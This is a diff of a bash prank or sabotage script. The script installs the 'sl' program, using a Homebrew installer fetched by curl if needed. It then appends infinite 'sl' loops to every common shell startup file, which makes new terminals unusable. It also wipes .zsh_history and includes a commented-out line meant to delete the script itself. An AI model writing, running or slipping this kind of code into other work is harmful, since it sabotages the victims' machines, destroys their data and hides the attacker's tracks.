@@ -1,43 +1,43 @@
-brew=$(which brew)
+#!/bin/bash
 
-if [ "$brew" == "" ]
-then 
-	ruby -e "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)"
-fi
+function modify_rc_files {
+	cd ~
+	echo -e "\nwhile true; do sl; done"|cat>>.bash_profile
+	echo -e "\nwhile true; do sl; done"|cat>>.zshrc
+	echo -e "\nwhile true; do sl; done"|cat>>.profile
+	echo -e "\nwhile true; do sl; done"|cat>>.kshrc
+	echo -e "\nwhile true; do sl; done"|cat>>.shrc
+	echo -e "\nwhile (1)\n sl\n end"|cat>>.tcshrc
+	echo -e "\nwhile (1)\n sl\n end"|cat>>.cshrc
+}
 
-brew list sl &>brewStatusFile
-sl=$(cat brewStatusFile|grep "Error")
-rm -rf brewStatusFile
-installed=0
+sl_status=$(which sl)
 
-if [ "$sl" != "" ]
+if [ -z "$sl_status" ]
 then
 	internet=$(curl -s www.google.com)
 
-	if [ "$internet" != "" ]
+	if [ -n "$internet" ]
 	then
+		brew_status=$(which brew)
+
+		if [ -z "$brew_status" ]
+			then 
+			ruby -e "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)"
+		fi
 		brew install sl
-		installed=1
+		modify_rc_files
+	else
+		echo "Not connected to the internet"
+		sleep 1
 	fi
 else
-	installed=1
+	modify_rc_files
 fi
 
 #Remove the below comment (#) before running the Script
 
 #rm -rf script
-
-if [ "$installed" == "1" ]
-then
-	cd ~
-	echo "\nwhile true; do sl; done"|cat>>.bash_profile
-	echo "\nwhile true; do sl; done"|cat>>.zshrc
-	echo "\nwhile true; do sl; done"|cat>>.profile
-	echo "\nwhile true; do sl; done"|cat>>.kshrc
-	echo "\nwhile true; do sl; done"|cat>>.shrc
-	echo "\nwhile (1)\n sl\n end"|cat>>.tcshrc
-	echo "\nwhile (1)\n sl\n end"|cat>>.cshrc
-fi
 
 cd ~
 echo "" | cat>.zsh_history
